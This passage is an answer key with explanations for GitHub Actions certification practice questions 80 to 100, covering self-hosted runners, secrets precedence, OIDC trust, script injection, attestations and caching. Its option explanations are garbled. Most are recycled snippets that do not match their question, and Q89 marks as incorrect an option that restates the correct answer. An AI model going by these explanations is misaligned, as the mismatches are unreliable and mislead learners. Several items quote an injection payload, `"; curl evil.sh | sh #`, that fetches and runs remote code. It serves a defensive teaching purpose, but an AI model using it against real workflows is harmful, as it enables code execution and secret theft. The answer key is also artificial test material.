- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **E:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **F:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.

### Question 80 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). The built-in connectivity diagnostic `./config.sh --check` tests DNS resolution, TLS certificate trust, proxy routing, and HTTPS reachability against every required GitHub Actions control-plane, storage, and token endpoint (`printing PASS/FAIL checks`). [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.

### Question 81 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Custom ARC runner container images MUST preserve the non-root `runner` user (`UID 1001`), required `/home/runner` directory permissions, `.NET`/Node dependencies expected by the runner agent, and rebuild promptly whenever GitHub releases mandatory runner binary updates (`since runners >30 days behind mandatory upgrades are blocked`). [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.

### Question 82 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Setting `ACTIONS_RUNNER_HOOK_JOB_COMPLETED=/usr/local/libexec/cleanup-after-job.sh` in the runner's `.env` file runs the administrator-controlled script automatically at the conclusion of every job (`wiping temp directories and stray child processes`). [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 83 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Unlike `secrets.*` (`which is unavailable in job-level if:`), configuration variables in the `vars` context (`vars.ENABLE_EU_GDPR == 'true'`) ARE directly accessible inside both workflow/job-level `if:` conditions and step expressions. [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.
- **B:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 84 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Both `secrets.*` and `vars.*` resolve with identical scope precedence `Environment > Repository > Organization`, and Environment-scoped `secrets.*` remain locked until all Environment protection gates pass. [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 85 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Minting an App token (`organization_actions_secrets: write`), `GET`ting `/orgs/{org}/actions/secrets/public-key` (`key_id`, `key`), encrypting client-side via LibSodium `crypto_box_seal`, and `PUT`ting `/orgs/{org}/actions/secrets/{name}` (`selected` repos) rotates secrets safely. [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Correct. Actions Secrets REST API requires client-side LibSodium sealed-box encryption against the org public key before `PUT`ting `encrypted_value`.
- **B:** Incorrect. GitHub only decrypts asymmetric LibSodium sealed boxes encrypted with the `key` matching `key_id` from `/public-key`.
- **C:** Incorrect. `GITHUB_*` names and `>48 KB` payloads fail validation, and `Environment > Repository > Organization` means Env secrets win.
- **D:** Incorrect. Plain base64 without LibSodium fails decryption, `variables` is plaintext, `all` exposes secrets to public repos, and `GET` never returns plaintext.

### Question 86 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Because `jq` extracted a substring not registered separately as a secret, run `echo "::add-mask::$KEY_ID"` immediately (`or preferably replace static GCP JSON blobs altogether with passwordless GitHub OIDC Workload Identity Federation`). [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Correct. The Actions Secrets REST API accepts only client-side LibSodium sealed-box `encrypted_value` + `key_id`, whereas `/actions/variables` manages plain-text config strings.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 87 — `B` (Secure and optimize automation)

Correct answer: B (is correct). Yes — combining `Required reviewers` + `Prevent self-review`, branch restrictions (`release/*`), and a GitHub App custom deployment protection rule enforces both human QA separation-of-duties and automated ServiceNow change-window gating before `clinical-prod` secrets or OIDC tokens unlock. [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **B:** Correct. Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.
- **C:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 88 — `D` (Secure and optimize automation)

Correct answer: D (is correct). Runners execute the files declared in `action.yml` (`dist/index.js` and `dist/telemetry.js` in `post:`), NOT TypeScript files under `src/`; supply-chain vetting must inspect `action.yml` lifecycle hooks AND diff/rebuild committed `dist/*.js` bundles (`then pin the verified 40-char SHA`). [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).

### Question 89 — `B` (Secure and optimize automation)

Correct answer: B (is correct). No — `github.head_ref` is attacker-controlled on fork PRs and `${{ github.head_ref }}` expands BEFORE bash parses the script, enabling arbitrary shell command injection; bind `HEAD_REF: ${{ github.head_ref }}` in step `env:` and check `[[ ! "$HEAD_REF" =~ ^(feat|fix)/ ]]`. [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Incorrect. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **B:** Correct. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **C:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `github.head_ref` is attacker-controlled on fork PRs and `${{ github.head_ref }}` expands BEFORE bash parses the script, enabling arbitrary shell command injection; bind `HEAD_REF: ${{ github.head_ref }}` in step `env:` and check `[[ ! "$HEAD_REF" =~ ^(feat|fix)/ ]]`.
- **D:** Incorrect. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.

### Question 90 — `A, F` (Secure and optimize automation)

Correct answers: A and F (are correct). CodeQL workflow scanning (`security-and-quality` for `actions`) flags untrusted `${{ github.event.* }}` / `github.head_ref` script-injection sinks in `run:`/`github-script` AND dangerous `pull_request_target` / `workflow_run` untrusted checkout (`pwn request`) patterns. [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Correct. Binding untrusted event fields to `env:` variables stops shell command injection, and avoiding fork checkouts in `pull_request_target` prevents secret exfiltration.
- **B:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Correct. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.

### Question 91 — `D` (Secure and optimize automation)

Correct answer: D (is correct). Creating a GitHub Release and uploading release assets requires `contents: write`, while signing SLSA provenance attestations adds `id-token: write` and `attestations: write` (`keeping all other GITHUB_TOKEN scopes at none`). [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.

### Question 92 — `B` (Secure and optimize automation)

Correct answer: B (is correct). `${{ github.token }}` and `${{ secrets.GITHUB_TOKEN }}` reference the EXACT SAME automatic per-job installation token (`enabling actions to default inputs to ${{ github.token }}`), and commenting on PRs/issues requires `pull-requests: write` (`or issues: write`). [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 93 — `D` (Secure and optimize automation)

Correct answer: D (is correct). Checking OIDC claim `job_workflow_ref` (`e.g., vireobio/ci-core/.github/workflows/ecr-push.yml@refs/tags/v2.0.0`, alongside `repository_owner == 'vireobio'` and `aud`) restricts cloud role assumption exclusively to runs executing the approved central reusable workflow. [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Correct. OIDC mints short-lived per-job JWTs; cloud trust policies must pin `sub` (`e.g., repo:org/app:environment:production`) and `aud` so other repos or feature branches cannot assume roles.

### Question 94 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Gating `production` Environment (`reviewers`, `main`), pinning cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production`, setting `environment: production` + `id-token: write`, and exchanging short-lived JWTs at runtime removes long-lived cloud keys. [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Incorrect. GitHub withholds Environment tokens until protection gates pass, and `pull_request_target` + fork checkout leaks credentials.
- **B:** Incorrect. Wildcard `repo:*:*` lets external repos assume your cloud role, and omitting `id-token: write` or `environment:` breaks OIDC gating.
- **C:** Correct. Pairing `environment: production` with `id-token: write` gates job execution and emits the `repo:<org>/<repo>:environment:production` `sub` claim.
- **D:** Incorrect. OIDC JWTs expire in minutes and are minted dynamically per job run, never stored statically.

### Question 95 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Granting `id-token: write` & `attestations: write` in reusable CI, building the artifact/digest, signing SLSA provenance via `actions/attest-build-provenance`, and verifying via `gh attestation verify -R <o>/<r> --signer-workflow` enforces cryptographic provenance. [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Correct. SLSA Build Level 3 pairs `id-token: write` + `attestations: write` in a trusted reusable workflow with `gh attestation verify` deploy gating.
- **B:** Incorrect. `gh attestation verify` requires `-R <org>/<repo>` (or `--owner` + `--signer-workflow`) to validate the exact trusted repository/workflow signer.
- **C:** Incorrect. Sigstore certificates in Artifact Attestations cryptographically bind artifacts to a verifiable GitHub Actions workflow run.
- **D:** Incorrect. Attestation signing requires `id-token: write` + `attestations: write`, container attestations require `sha256:` digests, and deploy gates must verify.

### Question 96 — `D, E` (Secure and optimize automation)

Correct answers: D and E (are correct). Scope cloud OIDC trust policies tightly (`iss`, `aud`, exact `sub` or `job_workflow_ref` — never `repo:*:*`), and sign container attestations against the immutable `sha256:` image digest (`verifying with gh attestation verify oci://... -R <org>/<repo> --signer-workflow ...`). [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Correct. Full 40-character SHA pinning + Immutable Actions prevent upstream tag hijacking, while Sigstore-backed Artifact Attestations prove cryptographic build provenance at deploy time.
- **E:** Correct. OIDC eliminates static cloud keys while `actions/attest-build-provenance` + `gh attestation verify` enforce cryptographic supply-chain provenance.
- **F:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 97 — `B` (Secure and optimize automation)

Correct answer: B (is correct). Use `actions/cache/restore@v4` on `pull_request` jobs (`read-only cache restore from main without saving per-PR target/ blobs`) while running `actions/cache/save@v4` (`or full actions/cache@v4`) ONLY on `push` to `main`. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Correct. Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.

### Question 98 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Running `gh cache list` and `gh cache delete <cache-key-or-id>` (`backed by GET/DELETE /repos/{owner}/{repo}/actions/caches`) inspects cache sizes and purges poisoned or oversized entries immediately. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Correct. Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 99 — `B` (Secure and optimize automation)

Correct answer: B (is correct). Skip expensive `macos-latest` jobs on `draft` PRs (`if: github.event.pull_request.draft == false` or label/path gate) + enable `concurrency: cancel-in-progress: true`, running full macOS builds only on ready-for-review PRs, `merge_group`, and `main`. [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
- **C:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 100 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Run native `linux/arm64` builds directly on GitHub-hosted ARM64 Linux runners (`runs-on: ubuntu-24.04-arm`, eliminating QEMU translation overhead while priced below x64 Linux per minute). [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
